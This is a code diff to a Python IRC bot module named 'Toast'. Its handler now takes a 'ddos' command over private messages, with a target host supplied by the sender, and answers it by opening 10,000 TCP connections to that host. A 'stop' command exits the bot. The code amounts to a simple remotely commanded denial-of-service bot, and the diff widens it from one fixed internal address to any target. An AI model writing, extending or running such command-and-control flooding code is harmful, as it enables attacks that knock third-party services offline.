@@ -1,4 +1,4 @@
-import os
+import sys
 import socket
 
 from .. import BaseResponder
@@ -20,16 +20,19 @@ class Toast(BaseResponder):
     def handle_privmsg(self, msg):
         if self.is_command(msg):
             command = (str(msg).split('!')[-1])
-            print('got command: %s' % command)
+            print('>>> COMMAND RECEIVED: %s' % command)
             self.respond(msg, command + ' ok!')
-            if command == 'ddos':
-                self.dudos(host='192.168.1.52', port=8080)
+            cmd = command.split()
+            if cmd[0] == 'ddos' and cmd[1]:
+                self.dudos(host=cmd[1])
+            elif cmd[0] == 'stop':
+                sys.exit()
 
     def dudos(self, host='127.0.0.1', port=8080, times=10000):
-        for x in range(times):
+        for _ in range(times):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
-            sock.send('hello')
+            sock.send(b'hello')
             sock.close()
 
 mod = Toast
